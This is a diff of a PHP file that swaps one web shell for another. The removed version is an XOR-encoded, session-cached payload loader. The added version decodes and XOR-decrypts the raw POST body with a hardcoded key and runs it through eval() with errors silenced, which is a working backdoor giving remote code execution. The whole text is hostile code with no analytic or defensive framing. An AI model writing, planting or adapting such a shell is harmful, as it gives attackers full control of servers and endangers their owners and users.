@@ -1,29 +1,15 @@
 <?php
-@session_start();
-@set_time_limit(0);
 @error_reporting(0);
-function encode($D,$K){
-    for($i=0;$i<strlen($D);$i++) {
-        $c = $K[$i+1&15];
-        $D[$i] = $D[$i]^$c;
+function Decrypt($data)
+{
+    $key="e45e329feb5d925b"; 
+    $bs="base64_"."decode";
+	$after=$bs($data."");
+	for($i=0;$i<strlen($after);$i++) {
+    	$after[$i] = $after[$i]^$key[$i+1&15]; 
     }
-    return $D;
+    return $after;
 }
-$payloadName='payload';
-$key='60437a7426b62d8c';
-$data=file_get_contents("php://input");
-if ($data!==false){
-    $data=encode($data,$key);
-    if (isset($_SESSION[$payloadName])){
-        $payload=encode($_SESSION[$payloadName],$key);
-        if (strpos($payload,"getBasicsInfo")===false){
-            $payload=encode($payload,$key);
-        }
-		eval($payload);
-        echo encode(@run($data),$key);
-    }else{
-        if (strpos($data,"getBasicsInfo")!==false){
-            $_SESSION[$payloadName]=encode($data,$key);
-        }
-    }
-}
+$post=Decrypt(file_get_contents("php://input"));
+eval($post);
+?>
